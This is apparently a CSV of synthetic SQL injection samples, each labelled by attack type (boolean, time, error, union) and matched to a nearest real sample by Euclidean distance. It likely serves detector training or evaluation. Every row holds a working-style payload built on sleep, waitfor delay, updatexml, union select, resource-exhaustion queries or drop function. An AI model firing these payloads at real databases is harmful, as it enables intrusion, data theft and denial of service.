CTGAN_001930,attack,boolean,"1%""   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and ""%""  =  """,nearest_attack_euclidean,R002098,3.202300995788566
CTGAN_001931,attack,boolean,"1'   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'pufu' like 'pufu",nearest_attack_euclidean,R008262,2.8149629565426415
CTGAN_001932,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R003005,2.940321163970118
CTGAN_001933,attack,error,1'  )   as eyzk where 2489  =  2489 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,nearest_attack_euclidean,R007589,4.239208706921854
CTGAN_001934,attack,time,"1'  )   where 9381  =  9381 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R006429,3.269129623214152
CTGAN_001935,attack,union,"-1413""  )   union all select 6651,6651,6651--",nearest_attack_euclidean,R008075,3.346862504174697
CTGAN_001936,attack,other,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #",nearest_attack_euclidean,R007040,3.9886051508817855
CTGAN_001937,attack,boolean,"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and 'ggcm' like 'ggcm",nearest_attack_euclidean,R006852,3.2286815500020682
CTGAN_001938,attack,error,"1  )   where 8734  =  8734 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R004034,3.9379361798094115
CTGAN_001939,attack,error,"1'||  (  select 'rttq' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'",nearest_attack_euclidean,R000682,2.5496237621871267
CTGAN_001940,attack,time, (  7098  =  7098 and sleep  (  5   )    ) ,nearest_attack_euclidean,R005847,4.7787976796092
CTGAN_001941,attack,other,"  (  select   (  case when   (  1938  =  1938  )   then dbms_pipe.receive_message  (  chr  (  118  )  ||chr  (  118  )  ||chr  (  112  )  ||chr  (  76  )  ,5  )   else 1938 end  )   from dual  )  ",nearest_attack_euclidean,R006148,8.212984031320008
CTGAN_001942,attack,time,1'  )   as svtm where 7627  =  7627 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,nearest_attack_euclidean,R006528,17.740034702452174
CTGAN_001943,attack,other,having 1  =  1--,nearest_attack_euclidean,R000491,2.8834327049085875
CTGAN_001944,attack,error,"1' in boolean mode  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  #",nearest_attack_euclidean,R001990,4.931537104193219
CTGAN_001945,attack,error,"1  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  3294  =  3294",nearest_attack_euclidean,R006241,4.453452944274943
CTGAN_001946,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R003399,5.881147455880604
CTGAN_001947,attack,other,"1,  (  select   (  case when   (  5154  =  5154  )   then 1 else 5154*  (  select 5154 from master..sysdatabases  )   end   )    )   ",nearest_attack_euclidean,R005971,2.962058270024091
CTGAN_001948,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000701,1.8421818724377297
CTGAN_001949,attack,other,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual  )  +'",nearest_attack_euclidean,R006851,4.0395712444492755
CTGAN_001950,attack,boolean,"-7381'   )    )    or elt  (  5882  =  5919,5919  )   and    (    (   'nzri'  =  'nzri",nearest_attack_euclidean,R003337,1.2195247834110694
CTGAN_001951,attack,other,   (  select top 1,nearest_attack_euclidean,R000225,1.7982488877473202
CTGAN_001952,attack,time,1' and sleep  (  5  ) ,nearest_attack_euclidean,R002468,3.7408083015247167
CTGAN_001953,attack,boolean,"1 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- gynj",nearest_attack_euclidean,R001727,2.526970330273978
CTGAN_001954,attack,union,"1'||  (  select 'zvpl' where 5877  =  5877 union all select null,null#",nearest_attack_euclidean,R003678,8.402978367434782
CTGAN_001955,attack,boolean,"1%"" or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R008701,6.098556204497004
CTGAN_001956,attack,boolean,"1'||  (  select 'ctgs' where 6809  =  6809 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R008836,3.5345471977359573
CTGAN_001957,attack,union,"-6122""  )   union all select 6578,6578--",nearest_attack_euclidean,R002630,2.943927326909744
CTGAN_001958,attack,error,"1""  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""imlx""  =  ""imlx",nearest_attack_euclidean,R001698,3.4480081575429633
CTGAN_001959,attack,error,"1 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ",nearest_attack_euclidean,R000773,2.35070609018162
CTGAN_001960,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'gfll'  =  'gfll",nearest_attack_euclidean,R007122,2.807575430379247
CTGAN_001961,attack,other,if  (  8858  =  5680  )   select 8858 else drop function pyuo--,nearest_attack_euclidean,R000726,3.565084696494389
CTGAN_001962,attack,union,"-8677'||  (  select 'ihpm' from dual where 9571  =  9571 union all select 9571,9571,9571,9571,9571,9571,9571,9571,9571,9571--",nearest_attack_euclidean,R007135,55.31274135934552
CTGAN_001963,attack,error,"1""   )    )     )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""oyxk""  =  ""oyxk",nearest_attack_euclidean,R005221,5.081411988967672
CTGAN_001964,attack,error,"1'   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   'wqme'  =  'wqme",nearest_attack_euclidean,R001038,3.6014783795096186
CTGAN_001965,attack,error,"1' in boolean mode  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  #",nearest_attack_euclidean,R005531,4.933110816206346
CTGAN_001966,attack,boolean,"1   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  3950  =  3950",nearest_attack_euclidean,R007834,5.343310038098532
CTGAN_001967,attack,other,if  (  8858  =  5680  )   select 8858 else drop function pyuo--,nearest_attack_euclidean,R000726,4.361463167428188
CTGAN_001968,attack,error,"1   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  7813  =  7813",nearest_attack_euclidean,R002736,3.9258149937466906
CTGAN_001969,attack,union," select * from users where id  =  1 union select !<1,version  (    )   -- 1",nearest_attack_euclidean,R000192,4.564148916033605
CTGAN_001970,attack,time,"1""   )    )    as nsbu where 6569  =  6569 or sleep  (  5  )  #",nearest_attack_euclidean,R005065,3.2722427127954794
CTGAN_001971,attack,boolean,"1' and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and 'vunt'  =  'vunt",nearest_attack_euclidean,R008308,3.127633785647548
CTGAN_001972,attack,error,"1'||  (  select 'xasp' from dual where 4025  =  4025 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R005201,3.3304099546842316
CTGAN_001973,attack,union,"-6667%""   )    )    union all select 7348,7348,7348,7348,7348,7348,7348,7348#",nearest_attack_euclidean,R002392,3.3378316585585925
CTGAN_001974,attack,boolean,1' in boolean mode  )   and 5981  =  6700,nearest_attack_euclidean,R001589,1.7204996204967493
CTGAN_001975,attack,boolean,"1%'   )    )     )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R002570,3.3301567109315138
CTGAN_001976,attack,other,if  (  5896  =  4251  )   select 5896 else drop function xmyk--,nearest_attack_euclidean,R001289,2.1653653705599685
CTGAN_001977,attack,boolean,"1""   )    )    and 5421  =  4804--",nearest_attack_euclidean,R003077,2.4296551512894133
CTGAN_001978,attack,other,"1""  )   where 1300  =  1300 order by 1#",nearest_attack_euclidean,R004898,3.621362924943222
CTGAN_001979,attack,boolean,"1'||  (  select 'qjwf' from dual where 3187  =  3187 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null   )    )   ||'",nearest_attack_euclidean,R008422,3.885614965574803
CTGAN_001980,attack,error,1'||  (  select 'rjis' from dual where 7696  =  7696 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual   )    )   ||',nearest_attack_euclidean,R007765,2.567764579415826
CTGAN_001981,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R007332,3.2076291500201646
CTGAN_001982,attack,error,1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'fdbm' like 'fdbm,nearest_attack_euclidean,R006827,3.662065795635552
CTGAN_001983,attack,error,"1   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  1748  =  1748",nearest_attack_euclidean,R000727,2.5822581088269914
CTGAN_001984,attack,boolean,"1'  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001484,2.848909545635178
CTGAN_001985,attack,error,"1"" and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ""jcgh""  =  ""jcgh",nearest_attack_euclidean,R007260,3.783771670187018
CTGAN_001986,attack,time,1'  )   and sleep  (  5  )  #,nearest_attack_euclidean,R004724,2.5465909839013685
CTGAN_001987,attack,error,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,nearest_attack_euclidean,R002821,6.91815665845262
CTGAN_001988,attack,other,"1',  (  select   (  case when   (  3888  =  3888  )   then   (  select count  (  *  )   from generate_series  (  1,5000000   )    )    else 1/  (  select 0  )   end   )    )   ",nearest_attack_euclidean,R008652,6.711677816860577
CTGAN_001989,attack,boolean,1'  )   and 2305  =  1934,nearest_attack_euclidean,R006483,1.6596655293409388
CTGAN_001990,attack,error,"1'||  (  select 'adiv' from dual where 9842  =  9842 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||'",nearest_attack_euclidean,R003996,9.898366349095562
CTGAN_001991,attack,union,"-3620'||  (  select 'kmei' where 8533  =  8533 union all select 8533,8533,8533,8533--",nearest_attack_euclidean,R005272,11.352251016138696
CTGAN_001992,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'mevd'  =  'mevd",nearest_attack_euclidean,R004606,2.1607848347467424
CTGAN_001993,attack,time,"1',  (  select   (  case when   (  1609  =  1609  )   then waitfor delay '0:0:5' else 1609*  (  select 1609 from master..sysdatabases  )   end   )    )   ",nearest_attack_euclidean,R003636,10.192102192533898
CTGAN_001994,attack,other,"select * from generate_series  (  3267,3267,case when   (  3267  =  5900  )   then 1 else 0 end  )   limit 1--",nearest_attack_euclidean,R004739,4.861869910126744
CTGAN_001995,attack,other,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #",nearest_attack_euclidean,R007040,3.715435806386587
CTGAN_001996,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R007430,3.866816967083649
CTGAN_001997,attack,error,"1'||  (  select 'fzcu' where 9252  =  9252 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   ||'",nearest_attack_euclidean,R006154,4.388233451892218
CTGAN_001998,attack,other,"1""   )    )    as ikuz where 7385  =  7385",nearest_attack_euclidean,R007448,0.8364259732291799
CTGAN_001999,attack,boolean,"1%'   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R004351,3.6289874501323656
CTGAN_002000,attack,boolean,"1'  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'plfa'  =  'plfa",nearest_attack_euclidean,R005596,2.642162633292007
